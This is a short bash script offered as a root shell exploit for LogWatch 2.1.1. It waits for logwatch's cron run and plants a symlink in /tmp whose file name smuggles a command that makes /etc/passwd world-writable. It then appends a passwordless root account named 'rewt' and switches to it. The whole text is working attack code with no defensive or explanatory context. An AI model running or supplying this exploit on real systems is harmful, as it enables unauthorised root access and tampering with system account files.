#!/bin/bash
    SERVANT="00-logwatch" # Logwatch's cron entry
    SCRIPTDIR=/etc/log.d/scripts/logfiles/samba/

    echo
    echo "LogWatch 2.1.1 root shell exploit"
    echo "Waiting for LogWatch to be executed"
     
    while :; do
      set `ps -o pid -C $SERVANT`
        if [ -n "$2" ]; then
          mkdir /tmp/logwatch.$2   
          ln -s $SCRIPTDIR'`cd etc;chmod 666 passwd #`' /tmp/logwatch.$2/cron
          break;
        fi
    done
    echo "Waiting for LogWatch to finish it's work"
    while :; do
      set `ps -o pid -C $SERVANT`
        if [ -z "$2" ]; then
          ls -l /etc/passwd|mail root
          echo rewt::0:0:rewt:/root:/bin/bash >> /etc/passwd
          break;
        fi
    done
    su rewt  
